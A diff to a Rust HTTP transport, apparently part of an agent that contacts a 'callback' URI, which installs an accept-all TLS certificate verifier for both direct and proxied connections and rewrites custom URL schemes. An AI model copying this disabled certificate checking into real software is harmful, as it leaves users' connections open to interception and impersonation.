@@ -13,6 +13,7 @@ use std::sync::{
 #[cfg(feature = "doh")]
 use crate::dns_resolver::doh::DohProvider;
 
+use crate::tls_utils::legacy::AcceptAllCertVerifier;
 use std::str::FromStr;
 
 /// gRPC frame header utilities for encoding/decoding wire protocol frames
@@ -371,7 +372,10 @@ impl Transport for HTTP {
 
     fn new(config: Config) -> Result<Self> {
         // Extract URI and EXTRA from config using helper functions
-        let callback = crate::transport::extract_uri_from_config(&config)?;
+        let c = crate::transport::extract_uri_from_config(&config)?;
+        let callback = c
+            .replace("http1s://", "https://")
+            .replace("http1://", "http://");
         let extra_map = crate::transport::extract_extra_from_config(&config);
 
         #[cfg(feature = "doh")]
@@ -400,6 +404,17 @@ impl Transport for HTTP {
         http.enforce_http(false); // Allow HTTPS
         http.set_nodelay(true); // TCP optimization
 
+        let tls_config = rustls_0_21::ClientConfig::builder()
+            .with_safe_defaults()
+            .with_custom_certificate_verifier(Arc::new(AcceptAllCertVerifier))
+            .with_no_client_auth();
+
+        let https = hyper_rustls_legacy::HttpsConnectorBuilder::new()
+            .with_tls_config(tls_config)
+            .https_or_http()
+            .enable_http1()
+            .wrap_connector(http);
+
         // Build the appropriate client based on configuration
         let client: Arc<dyn HttpClient> = match proxy_uri {
             Some(proxy_uri_string) => {
@@ -408,9 +423,8 @@ impl Transport for HTTP {
                     hyper_proxy_legacy::Intercept::All,
                     Uri::from_str(proxy_uri_string.as_str())?,
                 );
-                let mut proxy_connector =
-                    hyper_proxy_legacy::ProxyConnector::from_proxy(http, proxy)?;
-                proxy_connector.set_tls(None);
+                let proxy_connector =
+                    hyper_proxy_legacy::ProxyConnector::from_proxy_unsecured(https, proxy);
 
                 // Build client with proxy
                 Arc::new(hyper_legacy::Client::builder().build(proxy_connector))
@@ -418,7 +432,7 @@ impl Transport for HTTP {
             #[allow(non_snake_case) /* None is a reserved keyword */]
             None => {
                 // No proxy configuration
-                Arc::new(hyper_legacy::Client::builder().build(http))
+                Arc::new(hyper_legacy::Client::builder().build(https))
             }
         };
 
